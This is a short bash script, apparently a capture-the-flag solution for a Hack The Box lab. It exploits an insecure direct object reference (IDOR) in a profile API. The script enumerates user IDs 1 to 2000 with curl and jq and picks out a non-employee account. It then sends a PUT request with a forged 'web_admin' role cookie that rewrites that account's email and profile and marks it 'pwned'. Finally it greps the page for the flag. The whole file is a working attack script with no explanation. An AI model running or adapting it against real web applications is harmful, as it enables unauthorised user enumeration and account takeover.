#!/bin/bash

url="http://178.62.39.119:30065/profile"

for id in {1..2000};do
    data=$(curl -s "$url/api.php/profile/$id");
    uuid=$(echo $data|jq -r .uuid);
    role=$(echo $data|jq -r .role);

    echo $id $uuid $role
    if [ $role != "employee" ]; then
            echo "========================================="
            echo "found admin with id: $id " 
            curl -s -X GET "$url/api.php/profile/$id"|jq -r .role

            curl -i -s -k -X PUT --cookie "role=web_admin" -d "{\"uid\":$id,\"uuid\":\"$uuid\",\"role\":\"$role\",\"full_name\":\"No Name\",\"email\":\"flag@idor.htb\",\"about\":\"pwned\"}" "$url/api.php/profile/$id"
            curl $url/index.php| grep HTB
            exit 0
    fi


done